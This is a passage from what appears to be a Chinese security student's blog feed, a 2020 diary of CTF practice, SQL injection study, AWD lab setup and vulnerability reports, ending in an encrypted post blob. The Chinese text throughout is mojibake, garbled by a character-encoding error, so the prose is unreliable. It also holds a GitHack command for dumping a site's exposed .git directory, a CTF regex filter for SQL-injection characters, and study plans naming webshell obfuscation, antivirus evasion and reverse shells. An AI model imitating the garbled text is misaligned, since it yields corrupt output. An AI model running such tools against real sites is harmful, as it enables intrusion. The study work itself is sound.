æ³•ç”³è¯·åˆ°<code>HTTPS</code> æˆ‘æ— æ‰€è°“äº†, å¥½å¥½å­¦ä¹ å®‰å…¨å§!</p><p>æŒ‰ç…§è‡ªå·±çš„è®¡åˆ’æ¥!</p></li><li><p>å°±æ˜¯coding æœ‰äº¿ç‚¹ä¸ç¨³å®š -.- ä¸€å¤©æŒ‚äº†ä¸¤æ¬¡ </p></li></ul><p>å›½å†…å¤‡ç”¨ gitee : <a href="https://ifonlyddw.gitee.io/">https://ifonlyddw.gitee.io/</a> (æ„Ÿè§‰æ•°æ®æœ‰é—®é¢˜) å¿…é¡»æ‰‹åŠ¨æ›´æ–°</p><ul><li>æ›´æ¢äº†<code>banner</code>å›¾ç‰‡å’Œæ–‡ç« é¢„è§ˆå›¾ç‰‡</li><li>å¢åŠ <code>Gitalk</code> ç•™è¨€åŠŸèƒ½, æ¬¢è¿ç•™è¨€ç‰ˆè¯„è®º æ·»åŠ å‹é“¾</li></ul><h1 id="2020-02-15"><a href="#2020-02-15" class="headerlink" title="2020/02/15"></a>2020/02/15</h1><ul><li>ç°åœ¨æ˜¯ å‡Œæ™¨ <code>2:40</code> æˆ‘æ‰“ç®—å»ç¡è§‰äº† 0,0 :sleeping_bed:</li><li>çœ‹çœ‹æ˜å¤©èƒ½ä¸èƒ½ä¼˜åŒ–ä¸€ä¸‹<del>åšå®¢å‹é“¾å¤´åƒçš„</del>åŠŸèƒ½å§,ç„¶åå°±çœŸçš„ä¸èƒ½å†æ›´æ–°åšå®¢ä¸»é¢˜çš„å†…å®¹äº†,å°±è¿™æ ·äº†,æˆ‘å¾ˆå–œæ¬¢äº†!!!!!!!!!</li><li>ç°åœ¨æ˜¯ å‡Œæ™¨ <code>3:55</code> åšå®¢å…¨ä¼˜åŒ–å®Œæ¯•! </li></ul><p>æ„Ÿè°¢å¸ˆå‚…ä»¬çš„å¸®åŠ©, æ„Ÿè°¢ <code>jsdelivr</code> æä¾›çš„ CDNå¸®åŠ© , æ„Ÿè°¢<code>blinkfox</code> å¸ˆå‚…æä¾›çš„åšå®¢ä¸»é¢˜, æ„Ÿè°¢ <code>Coding</code> <code>GitHub</code> <code>PicGo</code> æä¾›åŒçº¿åŠ é€Ÿ,å’Œåšå®¢å›¾åº“æ­å»º,ä¸ºæˆ‘è§£å†³äº†è®¸å¤šé—®é¢˜, æ„Ÿè°¢<code>é˜¿é‡Œäº‘</code> æä¾›çš„åŸŸå ,ä½†æ˜¯ä¸çŸ¥é“æˆ‘<code>å½“åˆ</code>ä¹°ä½ çš„æ—¶å€™ åªè¦ <code>8</code> å—é’±å°±ä¸€å¹´äº†, æ˜¨å¤©<code>14</code>å· ç»­è´¹ä¸€å¹´å°± è¦ <code>49</code> å—é’±äº†, æ„Ÿè°¢ <code>typora</code> æä¾›çš„ç¼–è¾‘ç¯å¢ƒ, æ„Ÿè°¢é‚£äº›å‘æ˜<code>HTML JS CSS , JSON , PHP, MYSQL,ç­‰ç›®å‰æ‰€æœ‰è¯­è¨€çš„</code> å‘æ˜å®¶!</p><p>æ‰“å®Œè¿™æ®µæ„Ÿè°¢,å·²ç»æ˜¯<code>3:59</code> æˆ‘å†å»éƒ¨ç½²ä¸€ä¸‹,å°±ç¡è§‰äº†.  </p><p>:sleepy: :sleeping_bed:</p><ul><li>ä¼˜åŒ–äº†åšå®¢è®¸å¤šä¸œè¥¿, loading å›¾ç‰‡æ‡’åŠ è½½ å’Œ ä»£ç å‹ç¼© , ä¼˜åŒ–è®¿é—®é€Ÿåº¦åˆ°æé™</li><li>åˆ—å‡º SQLi æ¼æ´ å­¦ä¹ æ¡†æ¶, è¿™æ¬¡ä¸æ‰“ç®—åƒä»¥å‰é‚£æ ·ç›´æ¥ä¸€å£æ°”å­¦å®Œ, è€Œæ˜¯æ…¢ä¸€ç‚¹, æœ€è¿‘é¢ˆæ¤æœ‰ç‚¹ä¸èˆ’æœ</li><li>æ–°æ¢äº†ä¸€ä¸ªBOX çº¢è½´çš„é”®ç›˜m,60% é…åˆ—, å‹å·æ˜¯<code>anne pro 2</code>, ä¸‹é¢å±•ç¤ºä¸€ä¸‹å›¾ç‰‡, å¦‚æœä½ å–œæ¬¢æœºæ¢°é”®ç›˜, é‚£ä¹ˆéå¸¸æ¨è</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200216002510.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200216002547.jpg"></p><h1 id="2020-02-16"><a href="#2020-02-16" class="headerlink" title="2020/02/16"></a>2020/02/16</h1><ul><li>å¤ä¹ äº†ä¸€ä¸‹SQLè¯­æ³•</li><li>æ­å»ºäº†ä¸€ä¸ªåœ¨çº¿é¶åœº,æœ¬æ¥åªæ˜¯æƒ³æ­ä¸ªSQLi-labs,åé¢å°±æƒ³ç›´æ¥æä¸ªå¹³å°ç®—äº†</li></ul><p><a href="http://129.211.79.54/">http://129.211.79.54/</a></p><p>ç®—æ˜¯å®Œæˆæˆ‘å½“æ—¶åœ¨é«˜æ•°è¯¾ä¸Šçš„æ„æƒ³äº† 0,0 å¯’å‡é¡¹ç›®ä¹Ÿå°±è¿™æ ·äº†å§, æ­å»ºä¸€ä¸ªæ¼æ´å¹³å°,å½•è§†é¢‘, æ­AWD , å­¦åŸºç¡€æ¼æ´, å°±å·®æ—¥ç«™äº†,ä¸,æˆ‘SQLiè¿˜æ²¡å­¦å®Œ, æˆ‘è¿˜æƒ³å¤ç° CVE, ä½†æ˜¯äººä¸å¯èƒ½ä¸ç¡è§‰å§</p><ul><li>åæ­£å°±æ˜¯çæäº†ä¸€å¤©, æ˜å¤©å¼€å§‹ä¸“æ³¨èµ·æ¥! :dog:</li></ul><h1 id="2020-02-17"><a href="#2020-02-17" class="headerlink" title="2020/02/17"></a>2020/02/17</h1><p>æ¢äº†å¥—é”®å¸½</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200221234856.JPG"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200221234908.JPG"></p><h1 id="2020-02-19"><a href="#2020-02-19" class="headerlink" title="2020/02/19"></a>2020/02/19</h1><ul><li>æœ€è¿‘æœ‰ç‚¹é£˜?</li></ul><h1 id="2020-02-21"><a href="#2020-02-21" class="headerlink" title="2020/02/21"></a>2020/02/21</h1><p>ä»Šå¤©æ”¾æ¾äº†ä¸‹è‡ªå·±çš„èº«å¿ƒ, å‡†å¤‡è°ƒæ•´ä½œæ¯äº†, æ„Ÿè§‰ç†¬äº†ä¸€ä¸ªå¯’å‡çš„å¤œ èº«ä½“æœ‰ç‚¹ä¸è¡Œäº†,ä¸»è¦æ˜¯ç†¬å¤œæ•ˆç‡å¤ªä½çš„è¯å°±æ²¡å¿…è¦ç†¬å¤œ,è¿˜ä¸å¦‚æ—©æœŸ</p><p>æ‰€ä»¥ä»å°±ä»Šå¤©èµ· <strong>12ç‚¹ç¡è§‰,7:40èµ·åºŠ</strong></p><p>å…ˆåšæŒä¸€ä¸ªæ˜ŸæœŸå†è¯´,æ¯å¤©åœ¨å¯å®¤ç¾¤æ‰“å¡å¥½å§! ^.^ </p><p>æ˜å¤©ä¸€å¤©çœ‹å®ŒSQLæ³¨å…¥é‚£æœ¬ä¹¦! </p><h1 id="2020-02-22"><a href="#2020-02-22" class="headerlink" title="2020/02/22"></a>2020/02/22</h1><p>æ›´æ–°äº†kali </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update &amp;&amp; apt full-upgrade</span><br></pre></td></tr></table></figure><p>åœ¨è™šæ‹Ÿæœºä¸Šé¢å®‰è£…äº†ubuntu, å‡†å¤‡åœ¨è™šæ‹Ÿæœºä¸Šæ­å»ºAWDç¯å¢ƒ,å®éªŒä¸€ä¸‹èƒ½å¦å®ç°flagåŠ¨æ€åˆ·æ–°,</p><p>æˆ‘è§‰å¾—å­¦ä¹ SQLi çœ‹é‚£æœ¬ä¹¦ , çœ‹çš„çœŸçš„å¥½æ²¡æœ‰åŠ²â€¦. è¿˜ä¸å¦‚è€è€å®å®æŠŠSQL-labs åˆ·å®Œ.</p><h1 id="2020-02-23"><a href="#2020-02-23" class="headerlink" title="2020/02/23"></a>2020/02/23</h1><p>vim ä¸€é”®åˆ é™¤æ‰€æœ‰å†…å®¹: <code>ggdG</code></p><p>gg ä¸ºè·³è½¬åˆ°æ–‡ä»¶é¦–è¡Œ, dG ä¸ºåˆ é™¤å…‰æ ‡æ‰€åœ¨è¡Œä»¥åŠæ‰€å…¶ä¸‹çš„æ‰€æœ‰è¡Œçš„å†…å®¹</p><p>ç ”ç©¶äº†ä¸¤é“æ¯”è¾ƒæœ‰è¶£çš„é¢˜,æ¯”èµ·çœ‹ä¹¦æœ‰æ„æ€å¤šäº†,å¯æƒ³è€ŒçŸ¥ä¹‹å‰æµªè´¹äº†å¤šå°‘æ—¶é—´!!!!</p><h1 id="2020-02-24"><a href="#2020-02-24" class="headerlink" title="2020/02/24"></a>2020/02/24</h1><p>æœ€è¿‘çš„å­¦ä¹ è®¡åˆ’å°±æ˜¯ç»ƒä¹ ä¸‹CTF(WPå¤ç° , ğŸ˜„)</p><p>emâ€¦ pycharm ä¸€é”®æ ¼å¼åŒ–ä»£ç </p><p><code>Ctrl+A</code> å…¨é€‰ <code>Ctrl+Alt+L</code> åœ¨PHPstorm é‡ŒåŒæ ·ä¹Ÿæ˜¯</p><h1 id="2020-02-25"><a href="#2020-02-25" class="headerlink" title="2020/02/25"></a>2020/02/25</h1><ul><li>çœ‹è€å¤§çš„ celebration of life ä»ªå¼, ç†¬å¤œåˆ°5ç‚¹,ç›¸å½“äºé€šå®µäº†å§,u1s1,é€šå®µçœŸçš„å¥½ä¼¤èº«ä½“,ç¬¬äºŒå¤©æ„Ÿè§‰èº«ä½“éƒ½æ˜¯è½¯çš„</li></ul><h1 id="2020-02-29"><a href="#2020-02-29" class="headerlink" title="2020/02/29"></a>2020/02/29</h1><p>GitHack, ç”¨ cmd è¿è¡Œ, å…ˆ cd åˆ° GitHack ç›®å½•ä¸‹, ç„¶å <code>python2  GitHack.py yoururl/.git/</code></p><p>å‘œå‘œå‘œ, ä»¥å‰ä¸€ç›´ä»¥ä¸ºæ˜¯æˆ‘ç¯å¢ƒæœ‰é—®é¢˜ 0.0</p><p>å…¶ä»–å·¥å…·åŒç†</p><h1 id="2020-å¹´-3-æœˆè®¡åˆ’"><a href="#2020-å¹´-3-æœˆè®¡åˆ’" class="headerlink" title="2020 å¹´ 3 æœˆè®¡åˆ’"></a>2020 å¹´ 3 æœˆè®¡åˆ’</h1><p>æ·±å…¥å­¦ä¹  session cookie æœºåˆ¶, webshell æ··æ·†,å…æ€åŸç†, åå¼¹shell ,</p><p> æ¡†æ¶å­¦ä¹ (mvc, flask,tp,python ç½‘ç»œçˆ¬è™«), ç†Ÿç»ƒç”¨pythonæˆ–è€…phpç¼–å†™poc</p><p>æŒæ¡å¤§æ¦‚çš„æ¼æ´æŒ–æ˜(SRC)çš„æ€è·¯, <strong>6æœˆå‰å¿…é¡»å‡ºä¸€ä¸ªæ¼æ´</strong> ,ä¸ç®¡æ˜¯ä»€ä¹ˆç­‰çº§çš„</p><p>å¤šè¿åŠ¨,å¦‚æœå¼€å­¦äº†,è®°å¾—æ¯ä¸ªæ˜ŸæœŸä¸å¾—å°‘äº3æ¬¡è¿åŠ¨, è§„å¾‹ä½œæ¯,ä¸åƒåƒåœ¾é£Ÿå“, and  ä¿æŒå¾®ç¬‘ğŸ˜Š</p><p>æœ€è¿‘çš„CTF æ¯”èµ›æ¯”è¾ƒçˆ±å‡º node js â€¦. æˆ‘js éƒ½ä¸ä¼šç¼–.. æ…¢æ…¢å­¦, å¤šæ­£åé¦ˆå°±ok</p><h1 id="CTF-ä¸çŸ¥è¯†å­¦ä¹ "><a href="#CTF-ä¸çŸ¥è¯†å­¦ä¹ " class="headerlink" title="CTF  ä¸çŸ¥è¯†å­¦ä¹ "></a>CTF  ä¸çŸ¥è¯†å­¦ä¹ </h1><ol><li>å­¦åˆ°ä¸œè¥¿æ˜¯å…³é”®</li><li>æ—¥å¸¸çœ‹åˆ°çš„ç‚¹,ä¸è¦ä»…ä»…æ˜¯çœ‹è¿‡,è¦å»å¤ç°</li><li>æœ‰æ—¶å€™ä¸æ˜¯ä¸ä¼š,è€Œæ˜¯ä½ æ²¡æœ‰å»ç ”ç©¶è¿‡</li><li>å¤šç ”ç©¶,ä»¥èµ›ä»£ç»ƒ</li><li>æ‰©å¤§çŸ¥è¯†é¢(å¸¸è§æ¼æ´,å­¦ä¹ å¼€å‘,å¤ç°é¢˜ç›®ä»£ç ç­‰)</li><li>å‰æœŸä¹¦ç±(åšå®¢æ–‡,ç½‘ä¸Šæ€»ç»“)+åˆ·é¢˜</li><li>å·©å›ºæ‰€å­¦çš„å„ç±»åŸºç¡€æ¼æ´çŸ¥è¯†</li><li>å°è¯•åˆ©ç”¨php,pythonç¼–å†™exp,å·¥å…·å¹³å°</li><li>ç°å®æ¼æ´çš„å¤ç°,cve,cmsç­‰</li><li>å°è¯•ä»åšé¢˜äººè½¬å˜ä¸ºå‡ºé¢˜äºº</li></ol><h1 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h1><ul><li>æ¼æ´å®¡æŸ¥èƒ½åŠ›</li><li>å¿«é€Ÿç¼–å†™è„šæœ¬çš„èƒ½åŠ›</li><li>æƒé™ç»´æŒçš„èƒ½åŠ›</li></ul><h1 id="éœ€è¦ä»€ä¹ˆ"><a href="#éœ€è¦ä»€ä¹ˆ" class="headerlink" title="éœ€è¦ä»€ä¹ˆ"></a>éœ€è¦ä»€ä¹ˆ</h1><ul><li>ä¸°å¯Œçš„ä»£ç å®¡è®¡æŠ€å·§</li><li>ç†Ÿç»ƒè¿ç”¨python</li><li>ä¸€æ•´å¥—è‡ªå·±çš„æƒé™ç»´æŒæµç¨‹</li></ul><h1 id="2020-03-08"><a href="#2020-03-08" class="headerlink" title="2020/03/08"></a>2020/03/08</h1><ul><li><p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆçªç„¶å°±æ„Ÿè§‰å‹åŠ›å¥½å¤§ , è€é“</p></li><li><p>å¯èƒ½æ˜¯å› ä¸ºåšxctfç¬¬ä¸€åœºæŠŠ..å¥½å¤šéƒ½æ²¡è§è¿‡,å¥½ä¸å®¹æ˜“ä¸€ä¸ªé¢˜çªç ´å°±å»äº†,åé¢è¿˜æœ‰æ›´å¤šçš„ç‚¹è¦å»åš.å…¶å®è¿˜æ˜¯å¤ªèœäº† :-(</p></li><li><p>æ— æ„ä¸­çœ‹çš„p3å¸ˆå‚…çš„ä¸€ç¯‡æ–‡ç« , åˆç»™äº†æˆ‘åŠ¨åŠ›, æˆ‘å…³æ‰äº†æ‰€æœ‰æ‰“å¼€çš„çª—å£,å†™ä¸‹ä»Šå¤©çš„æ„Ÿå—,èœå…¶å®ä¸æ˜¯åŸå› ,ä¸åŠªåŠ›æ‰æ˜¯åŸå› </p></li><li><p>å°±è¿™æ ·å§. å¤šæŠ˜è…¾,ä¸è¦æ”¾å¼ƒ</p></li></ul><h1 id="2020-03-13"><a href="#2020-03-13" class="headerlink" title="2020/03/13"></a>2020/03/13</h1><p>ç»§ç»­å­¦ä¹ äº†phpååºåˆ—åŒ–å’Œæ–‡ä»¶ä¸Šä¼ , è¿˜æœ‰curl ä¸‹è½½æ–‡ä»¶ç¡®å®æ˜¯ç¬¬ä¸€æ¬¡é‡è§å‘€!!!çœŸçš„å¯ä»¥,å¸ˆå‚…ä»¬å°±æ˜¯å‰å®³-.-</p><p>ä¸å¤šè¯´äº†,æ˜å¤©ä¸Šåˆèµ·æ¥åšé¢˜ä¹‹å‰æŠŠcurl çš„æ“ä½œæ€»ç»“ä¸€é,(å…¶å®ä¹‹å‰å°±æƒ³æ€»ç»“çš„,ä½†æ˜¯å¤ªæ‡’äº†), 0.0 ğŸ˜</p><p>binwalk æå–æ–‡ä»¶ -e (extract)</p><h1 id="2020-03-14"><a href="#2020-03-14" class="headerlink" title="2020/03/14"></a>2020/03/14</h1><p>æŒ–äº†æŸå¤§å­¦çš„å›¾ä¹¦é¦†åå°çš„ä¸€ä¸ªæœ€èœçš„æ¼æ´â€¦å·²ç»æäº¤ä¸çŸ¥é“èƒ½ä¸èƒ½è¿‡,è¿˜æ˜¯æŒºæ¿€åŠ¨çš„,ç¬¬ä¸€ä¸ªæ¼æ´â€¦. ä¸“å±SRCå¤ªéš¾æŒ–äº† ä»å…¬ç›ŠSRCå¼€å§‹å­¦ä¹ å§â€¦</p><p>è¿˜æ˜¯ä¸»è¦çš„å¿ƒæ€åœ¨å­¦ä¹ æŠ€æœ¯å’Œä»£ç å®¡è®¡ä»¥åŠæ‰“CTF(å’ŒæŒ–æ´ä¸å†²çª,æ™šä¸ŠæŒ–æ´,ç™½å¤©çæ)</p><p>ğŸ˜„</p><h1 id="2020-03-16"><a href="#2020-03-16" class="headerlink" title="2020/03/16"></a>2020/03/16</h1><ul><li>ä»Šå¤©æœ‰ç‚¹æ°´â€¦. æ‰“ç®—é‡å¤´åˆ·ä¸€éDVWAå§, ç„¶åç»ƒä¹ python ç¼–ç¨‹â€¦</li><li>å‡†å¤‡æ­å»ºå±äºè‡ªå·±çš„XSSå¹³å°</li><li>æå‰å®Œæˆå‘¨è¾¹ä¸­çš„è®¡åˆ’</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. å¤ä¹ ä»¥å‰åšçš„CTFé¢˜çš„æ€è·¯,æ•´ç†ä¸€ä¸‹ç”µè„‘</span><br><span class="line">2. å‡†å¤‡å¼€å§‹æŒ–SRC,å…ˆä»å…¬ç›ŠSRCå¼€å§‹ç»ƒä¹ å§..åé¢å†å®¡ä¸€ä¸‹CMS</span><br><span class="line">3. ç»ƒä¹ ç¼–ç¨‹</span><br><span class="line">4. å¯èƒ½ä¼šå¼€å§‹å­¦ä¸€ä¸‹é«˜æ•°å’Œå¤§ç‰©</span><br></pre></td></tr></table></figure><ul><li>æ¯å¤©æŠ½1ä¸ªå°æ—¶å·¦å³çš„æ—¶é—´,ä»å¤´å¼€å§‹å­¦é«˜æ•°å’Œå¤§ç‰©,æ ¹æ®ç›®å‰çš„è¡Œæƒ…æ¥çœ‹,ææœ‰å¯èƒ½å¾ˆæ™šæ‰å¼€å­¦,è¦æ˜¯å»å­¦æ ¡å°±æ¥ä¸ªæµ‹è¯•ä»€ä¹ˆçš„,é‚£ä¸æ˜¯å‡‰é€äº†!!!</li></ul><h1 id="2020-03-20"><a href="#2020-03-20" class="headerlink" title="2020/03/20"></a>2020/03/20</h1><p>phpstorm å…¨å±€æœç´¢å¿«æ·é”® <code>ctrl + shift + f </code> èˆ’æœå•¦</p><p>äº¤äº†ä¸€ä¸ªæ´ç»™CNVDâ€¦è¦æ˜¯èƒ½è¿‡æˆ‘å°±å¾ˆå¼€å¿ƒäº† ğŸ˜„</p><blockquote><p>å‰å°æ½œåœ¨çš„æ¼æ´ç‚¹å°±æ˜¯æœç´¢åŠŸèƒ½ã€ç•™è¨€æ¿åŠŸèƒ½ï¼Œåå°æ½œåœ¨çš„æ¼æ´ç‚¹å°±æ˜¯ç™»å½•æ¡†æ³¨å…¥ã€cookieçš„è®¤è¯é—®é¢˜æˆ–æ˜¯å…¶ä»–æœªæˆæƒè®¿é—®ã€CSRFç­‰å¸¸è§çš„æ¼æ´</p></blockquote><p>å»ºç«™ç³»ç»ŸCMS å®¡è®¡æ€è·¯:   <code>ä»£ç åˆ†æ =&gt; åŠŸèƒ½ç‚¹</code> <code>åŠ¨æ€å®¡è®¡ =&gt; é™æ€å®¡è®¡</code> <code>å‚æ•°æ ¼å¼åŒ–æ¼æ´ =&gt; å¯æ§å‚æ•°</code> </p><h1 id="2020-03-23"><a href="#2020-03-23" class="headerlink" title="2020/03/23"></a>2020/03/23</h1><p>æ€»ç»“äº†ä¸€ç‚¹é“ç†</p><ul><li>æ¯å¤©ä¸ä¸€å®šæ˜¯å®‰æ’çš„è¶Šæ»¡è¶Šå¥½, æœ€å¥½ç•™ä¸€ç‚¹æ—¶é—´ç»™è‡ªå·±å»â€å……ç”µâ€,è¿™é‡Œçš„å……ç”µå½“ç„¶ä¹Ÿè¿˜æ˜¯å’Œå®‰å…¨å­¦ä¹ æœ‰å…³,åªæ˜¯ä¸è¦ä»…ä»…å±€é™äºå½“å‰æ‰€å­¦çš„å†…å®¹,æ¯”å¦‚çœ‹çœ‹æ¯æ—¥æ¨é€çš„ä¸€äº›æ–‡ç« ,æ„Ÿå…´è¶£çš„æ–‡ç« , è™½ç„¶ç°åœ¨æ²¡èƒ½åŠ›å¤ç°, ä½†æ˜¯å¯ä»¥æ‹“å®½çŸ¥è¯†é¢å’Œè§è¯†,æœªæ¥çš„æŸä¸€å¤©è¯´ä¸å®šå°±ä¼šç”¨åˆ°</li><li>æ‰“CTF , å…¶å®å’Œé«˜è€ƒ , å››çº§è¿™äº›è€ƒè¯•,åœ¨æŸäº›åœ°æ–¹æœ‰ç‚¹ç±»ä¼¼, æ¯”å¦‚: ç»†å¿ƒ,æŠ“ä½æ¯ä¸€ä¸ªç»†èŠ‚, ä¸æ”¾è¿‡æ¯ä¸€ä¸ªè¯·æ±‚, ç”šè‡³è¿HTMLçš„ä»£ç éƒ½å¯ä»¥è¯»ä¸€è¯»,å†è€…, å¤šåˆ·é¢˜, è€ƒè¯•å¤šåˆ·é¢˜çš„ä½œç”¨,å¸®åŠ©ç†è§£çŸ¥è¯†ç‚¹,çµæ´»è¿ç”¨çŸ¥è¯†ç‚¹,æ‰©å±•çŸ¥è¯†ç‚¹,æç‚¼æŠ€å·§,åœ¨CTFä¸­,æŒ–æ´å’Œæ¸—é€æˆ–è®¸ä¹Ÿæ˜¯å¦‚æ­¤</li><li>æ˜å¤©è®°å¾—æ´—è¢œå­å’Œåˆ·çƒé‹~</li></ul><h1 id="2020-03-25"><a href="#2020-03-25" class="headerlink" title="2020/03/25"></a>2020/03/25</h1><p>ä»Šå¤©ä¸çŸ¥é“å’‹æƒ³çš„â€¦ä¸€å¿ƒæƒ³å»æ­å»ºCTFdè¿™ä¸ªå¹³å°,å¯è‡ªå·±å¤ªèœäº†.å¼„äº†ä¸€å¤©éƒ½æ²¡å¼„äº†â€¦. è¿˜æ˜¯è€è€å®å®å­¦æŠ€æœ¯æŠŠâ€¦åˆ«å†çæäº†</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200325010107.png"></p><h1 id="2020-04-07"><a href="#2020-04-07" class="headerlink" title="2020/04/07"></a>2020/04/07</h1><p>å†™äºå‡Œæ™¨, buu åšéš¾é¢˜åšåˆ°è‡ªé—­äº†, æ‰“ç®—ç»ƒä¹ ä¸€ä¸‹å¼€å‘èƒ½åŠ›</p><p>å››æœˆè®¡åˆ’, æ„Ÿè§‰åˆ°äº†å¤§å­¦,å°±æ²¡æœ‰ä»€ä¹ˆå†™è®¡åˆ’çš„è®¡åˆ’, æœ‰å¥½å¤„ä¹Ÿæœ‰åå¤„, åå¤„å°±æ˜¯å®¹æ˜“ç²¾ç¥æ¶£æ•£, æ‰¾ä¸åˆ°äº‹åš</p><h1 id="2020-04-12"><a href="#2020-04-12" class="headerlink" title="2020/04/12"></a>2020/04/12</h1><p>åœ¨MYSQLä¸­, <code>1000</code> å’Œ<code>&#39;1000&#39;</code> æ˜¯ä¸€æ ·çš„,ä½†æ˜¯æœ‰äº›æ—¶å€™å°±å¯ä»¥ç”¨æ¥ç»•è¿‡</p><p>æ¯”å¦‚è¿™æ®µä»£ç , è¦idä¸º1000, æ‰è¾“å‡ºflag, è¿™é‡Œbanäº† <code>x</code> æ•…16è¿›åˆ¶æ— æ³•ç»•è¿‡äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&quot;&#x2F;or|\-|\\|\*|\&lt;|\&gt;|\!|x|hex|\+&#x2F;i&quot;,$id))</span><br></pre></td></tr></table></figure><p>ä»Šå¤©åšäº†ctfshowè¿™ä¸ªå¹³å°çš„é¢˜, å¾ˆå¤šå°ç‚¹ä»¥å‰éƒ½æ²¡æœ‰æ³¨æ„åˆ°, å¯ä»¥è¯´æ”¶è·è¿˜æ˜¯æŒºå¤§, ä¸è¿‡ä»¥åå­¦ä¸œè¥¿è¦å­¦ç¨³ä¸€ç‚¹äº†</p><h1 id="2020-04-13"><a href="#2020-04-13" class="headerlink" title="2020/04/13"></a>2020/04/13</h1><p>æ˜¨å¤©å·²ç»è¯´è¿‡äº†, ä¸è¦æ°´ç¾¤äº†, </p><p>ä»Šå¤©åˆ äº†ä¸€ç‚¹åšå®¢çš„æ–‡ç« , è§‰å¾—å†™çš„ä¸å¥½, ç›¸å½“äºæ²¡å†™çš„é‚£ç§, è€Œä¸”ç½‘ä¸Šä¸€æœä¸€å¤§æŠŠ, å°±æŠŠåˆ äº†</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;å£°æ˜: æœ¬åšå®¢çš„æ–‡ç« å‘å¸ƒæ—¥æœŸå¯èƒ½ä¸å‡†ç¡®, å› ä¸ºæˆ‘è®¾ç½®çš„urlæ ¼å¼, ä¸€å¤©åªèƒ½å‘å¸ƒä¸€ç¯‡æ–‡ç« , æ‰€ä»¥æˆ‘ä»¥åå°½é‡åœ¨æ–‡ç« å†…æ³¨æ˜å‘å¸ƒæ—¥æœŸ&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ç½®é¡¶: åšå®¢URL ç»“æ„é‡æ–°è®¾ç½®äº†, æ‰€ä»¥ä¹‹å‰çš„é“¾æ¥å¯èƒ½éƒ½æ— æ•ˆäº†-.-&lt;/stro</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Chrome æµè§ˆå™¨æ‰©å±•å¼€å‘åˆè¯•</title>
    <link href="https://hack-for.fun/62d1.html"/>
    <id>https://hack-for.fun/62d1.html</id>
    <published>2020-11-07T05:04:25.000Z</published>
    <updated>2020-11-07T15:11:59.324Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="æŠ±æ­‰, è¿™ä¸ªå¯†ç çœ‹ç€ä¸å¤ªå¯¹, è¯·å†è¯•è¯•." data-whm="æŠ±æ­‰, è¿™ä¸ªæ–‡ç« ä¸èƒ½è¢«æ ¡éªŒ, ä¸è¿‡æ‚¨è¿˜æ˜¯èƒ½çœ‹çœ‹è§£å¯†åçš„å†…å®¹."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="æ‚¨å¥½, è¿™é‡Œéœ€è¦å¯†ç ." /><label>æ‚¨å¥½, è¿™é‡Œéœ€è¦å¯†ç .</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="f5a0bf778cc83bf6ec67ac2e1b783c70c134fd8c3e3fe78ef8044666745781ad">b0cd213e786428c2f4163bc7fc936f3ab4f8357a47a76c02d7a0cdea4dba773799e908ddf5520a1ef5ab0c2439a478e7b256551082f599c54e4c77f29b86aad9f5f39ddf1617ec50f4538e2c11a88ab9b8ed965cf691a190ea671889a68e99c652ada8430575d2d2d7a8c8ab4397b7e60bc0c95435531dfa89f326f81c0f2367f738c1c74942df245f79cef23ccd684c48c5ed6142b82bb1aae196aff549a1163e4b51efbd02dd8760b373a18b484e935931513f900ab239c070522333f73edda6096d4ad71211a6d7d8a5c64c0f66866b6d76007d968df90fc468f85545f6e150f5082626a8b489de98f0f0bb37581d325b603b2778ab6ca2a942bae26a928562416adcd0a0fd2afa40eec3b8c42f495ab437406c6d2e1e041179b2f0fee1bcba1595abd1ef9feb15eff6c3801f04f44cd18429e605cae5a4cc09c4a2d3b65c678aafca270e2fda54ab5966896cf036533465356d4762443349378ff3bf8aa857d747132424dd6d627914fafb05a57909ff4655dd85a84863312af3b0e748f7ece50f8dd101fdca24d34543f041261367a2907a3ed79e09c4240276afc635220443fe9e611925bfc9477481466489168adfef2db4cb0d442cf253a467c95c42ea44b443038b408f394f9bf213c46f0bc94a7ebb6c176b8a1f5c2649b406682eb3abddbf39ab4764cd3da79f0dcba8df6551078c71df533eccb5cf7eb8a629649c620156f06c208754983a01c81ca9ad7047334ed04b344e8908ffd335ad6af46bd4a5fa8c4a8ae82209e07f155ee7d14573afd613c241cd61b813d6d6aa09bade70585eaa29371d59720e34f44838e61abd0fea38c3f9603c6165ea5336d558d016c42551eabfa0c95e966dfe2c3ad37b166be7e78ef5019cb1d30f434abf089ab2ac5ec16036e25a9b16a987c2ac62c46c02190ce530269bfed579435f25a050aca1c7ddbe95f3073d27c1c4dde47d480bfa527d26b0b3d9cb42079a33d64e0ee8a3d00816010d8d8c38c1fccf9701520e4d78e0b178ed31c5aebf50795e202d38bec5882a90b3dc8cf2b45000f28df9ab8e02b66ab8e4d19160348d769af50b91c96ec5fe27174bf79c724c2e13fb9656ad32bc43bae54e934e5cbb679480f2b467f6ac15e273b72c15be4932ee3e35fc20fb66dd44350f7617cfa329faf4e555f5d49a3297c952e57a35029bc727b25f8266fd562c3e7cfc2568440bd8b9e63ef7f02e31118e20656561f8e49f4c9b0499fe06a3484484c9a7e063a3cce8f74542937ee5ac50c7c543626d2bd49066f88af751387dc1d4c2e48157de7b18ba794b7300b880b294afef85cf29d869ac68ec5cb71bfe8944639d5b1011b0b24fd54b0d9b0cc82ff1cff6d993d6c917becd12628e9a1c4fdc0fc77654a1347fd04617b575dbff511026b54b62df2475c